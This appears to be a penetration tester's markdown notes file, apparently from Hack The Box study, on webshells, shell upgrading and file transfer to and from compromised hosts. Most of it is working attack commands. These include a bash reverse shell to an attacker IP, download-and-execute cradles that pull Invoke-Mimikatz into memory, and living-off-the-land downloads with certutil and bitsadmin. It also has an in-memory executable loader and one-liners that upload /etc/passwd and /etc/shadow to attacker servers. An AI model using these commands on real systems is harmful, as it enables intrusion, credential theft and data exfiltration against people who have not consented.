#exploit

### Webshells
#webshells
 -  Shell is a command interface with operating system
	- Reverse - victim connects to attacker
	- bind - attacker connects to victim
	- web - connect via web server
	- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings))
	- [PentestMonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
	- [Reverse Shell Cheat Sheet: PHP, Python, Powershell, Bash, NC, JSP, Java, Perl (highon.coffee)](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
	- `bash -c "bash -i >& /dev/tcp/10.10.16.5/9001 0>&1"`
- **Upgrading** shells
	- Upgrade TTY or teletypewrite
		- Python Pseudo terminal
			```bash
			which python
			python -c 'import pty; pty.spawn("/bin/bash")'
			python3 -c 'import pty; pty.spawn("/bin/bash")'
			ctrl+z
			stty raw -echo
			stty size
			fg
			reset
			export SHELL=bash
			stty rows 22 columns 156 Set remote shell to x number of rows & y columns
			export TERM=xterm-256color
			stty rows 67 columns 318
			```
	- [Upgrading Simple Shells to Fully Interactive TTYs - ropnop blog](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)
	- Upgrade web shells
		- Upload a more advanced shell based on web framework
			- ASP
			- PHP
			- JSP
		- Use an echo like command to write out a simple shell if no upload
		- Default webroots
			- Apache	/var/www/html/
			- Nginx	/usr/local/nginx/html/
			- IIS	c:\inetpub\wwwroot\
			- XAMPP	C:\xampp\htdocs\
		- Access upgraded shell
			- use parameters to pass in commands
				- browser
				- cURL
				- burpsuite
- Infil data - transfer to target
	- attacker runs python server victim runs wget or cURL
	- SCP if creds or ssh keys are known
	- echo base64 strings into shell then decode into file
		- use file or md5sum commands to validate file is correct
- Exfil data - transfer from target

[GitHub - MinatoTW/UltimateFileTransferList: Ultimate File Transfer List](https://github.com/MinatoTW/UltimateFileTransferList)

### File Transfers - Download
#filetransfer
- #livingoffland 
	- `bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe` using BITS to download a file
	- `Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"` using powershell to run BITS to download a file
	- `certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe` use certutil to download a file
- [[FTP]]
	- `sudo pip3 install pyftpdlib` Host a python FTP server to stage payloads
		- `sudo python3 -m pyftpdlib --port 21`
		- `(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')` copy file from python FTP server to target (windows)
- [[SMB]]
	- [[SMBserver]]
- https://lolbas-project.github.io/ windows
	- [[certutil]]
- https://github.com/topics/gtfobins linux
- [[Netcat]]
- webshells
- Bash
	- `exec 3<>/dev/tcp/10.10.10.32/80` connect to webserver
	- `echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3 | cat <&3` HTTP get request
	- `scp plaintext@192.168.49.128:/root/myroot.txt .` #SSH / #SCP file copy
	- `rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'` rdesktop rdp client to mount remote location
	- `xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer` xfreerdp rdp client to mount remote location
- B64 encoded files to bypass detections
	- [[Powershell]]
	- [[Bash]]
- Python
	- `python3 -m http.server` simple HTTP server to download files
	- `c:\Python27\python.exe -c 'import urllib;urllib.urlretrieve ("http://10.10.16.5:8080/juicypotato.exe", "juicypotato.exe")'` 
	- `python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'`
- PHP
	- `php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'`
	- `php -r 'const BUFFER = 1024; $fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'`
	- `php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash`
- Ruby
	- `ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'`
- JS
	- Create wget.js
		```javascript
		var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
		WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
		WinHttpReq.Send();
		BinStream = new ActiveXObject("ADODB.Stream");
		BinStream.Type = 1;
		BinStream.Open();
		BinStream.Write(WinHttpReq.ResponseBody);
		BinStream.SaveToFile(WScript.Arguments(1));
		```
	- `cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1` run wget.js with cscript
- VBScript
	- Create wget.vbs
		 ```vb
		 dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
			dim bStrm: Set bStrm = createobject("Adodb.Stream")
			xHttp.Open "GET", WScript.Arguments.Item(0), False
			xHttp.Send
			with bStrm
				.type = 1
				.open
				.write xHttp.responseBody
				.savetofile WScript.Arguments.Item(1), 2
			end with
		```
	- `cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1` run wget.vbs with cscript
- Powershell
	- [WebClient Class (System.Net) | Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-5.0)
		- `(New-Object Net.WebClient).DownloadFile('http://10.10.16.5:8000/pwnkit','pwnkit')`
		- `(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')`
		- `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')` 
		- `(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX`
	- [Webrequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.2)
		- `Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1`
	- Other download cradles [Download Cradles Â· GitHub](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)
	- Powershell Remoting/Session
		 - `$Session = New-PSSession -ComputerName DATABASE01` create a session variable
		 - `Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\` copy from local to remote
		 - `Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session` copy from remote to local
	- In memory example from chatgpt.com
		```powershell
		# URL of the executable file to download
		$url = "http://example.com/path/to/your/file.exe"  # Replace with your file URL
		# Function to download file content as byte array
		function Download-File {
		    param(
		        [string]$url
		    )
		    try {
		        $webRequest = [System.Net.WebRequest]::Create($url)
		        $webResponse = $webRequest.GetResponse()
		        $stream = $webResponse.GetResponseStream()
		        $memoryStream = New-Object System.IO.MemoryStream
		        $stream.CopyTo($memoryStream)
		        $memoryStream.ToArray()
		    }
		    catch {
		        Write-Error "Failed to download the file: $_"
		        exit 1
		    }
		}
		# Download the executable content as bytes
		$fileBytes = Download-File -url $url
		# Load the bytes into memory and execute
		try {
		    $assembly = [System.Reflection.Assembly]::Load($fileBytes)
		    $parameters = @()  # Any parameters to pass to the executable
		    $assembly.EntryPoint.Invoke($null, $parameters)
		}
		catch {
		    Write-Error "Failed to execute the executable: $_"
		    exit 1
		}
		```

### File Transfers - Upload
#filetransfer
- Web based
	- Powershell
		- `[Convert]::ToBase64String((Get-Content -path "C:\Users\Public\Loader.exe" -Encoding byte))` convert file to b64
		- `echo {b64 string}}| base64 -d > hosts` convert string to file, linux
		- `$b64 = [System.convert]::ToBase64String((Get-Content -Path '{filepath/filename}' -Encoding Byte))` b64 encode a file to a string
		- `Invoke-WebRequest -Uri http://10.10.16.5:8001/ -Method POST -Body $b64` send b64 string to an upload server or netcat
		- `Get-ChildItem -Path "C:\Users\Public\" -File | ForEach-Object {Invoke-RestMethod -Uri "http://10.10.16.5:8001/upload" -Method Post -ContentType "multipart/form-data" -InFile $_.FullName}` upload a bunch of files to updog
		- `Invoke-RestMethod -Uri "http://10.10.16.5:8001/upload" -Method Post -ContentType "multipart/form-data" -InFile "C:\Users\Public\mimi64.exe"` upload a single file to updog
	- Python
		- `python3 -m http.server` simple HTTP server to download files
		- `python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'` python oneliner to upload a file`
		- Upload server
			- `pip3 install uploadserver` python upload server, part of http.server
			- `openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'` create self signed cert
			- `openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj /CN=server` start the upload server with HTTPS					
	- Powershell
		- `IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')` ps script to interact with python upload server
		- `Invoke-FileUpload -Uri https://192.168.49.128:8000/upload -File {filepath/filename}` upload file to python server
	- PHP
			- `php -S 0.0.0.0:8000` simple PHP download server
	- Ruby
			- `ruby -run -ehttpd . -p8000` simple ruby download server
	- Bash
		- `scp {Local /Path/Filename} {user}@{remotelocation}:{Remote /Path/Filename}`
		-  `curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure`
	- Updog
	- Powershell
		```powershell
		$listener = [System.Net.HttpListener]::new()
		$listener.Prefixes.Add("http://*:8080/")
		$listener.Start()
		Write-Output "Listening on port 8080..."
		while ($listener.IsListening) {
		    $context = $listener.GetContext()
		    $response = $context.Response
		    $response.StatusCode = 200
		    $response.ContentType = "text/plain"
		    $response.OutputStream.Write([System.Text.Encoding]::UTF8.GetBytes("Hello, World!"), 0, 13)
		    $response.OutputStream.Close()
		}
		```
- [[SMB]]
	- webdav - smb over HTTP
		- `sudo pip3 install wsgidav cheroot` install python webdav server
		- `sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous` run webdav server
- [[FTP]]
	- `sudo python3 -m pyftpdlib --port 21 --write` start a FTP server to send files to from target to attacker
	- `(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', '{filepath\filename}')` FTP file to attacker from target
- #livingoffland 
	- `certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini` use certutil to POST a file
	- `openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh` use openssl to connect to a remote session and send the received data to a file

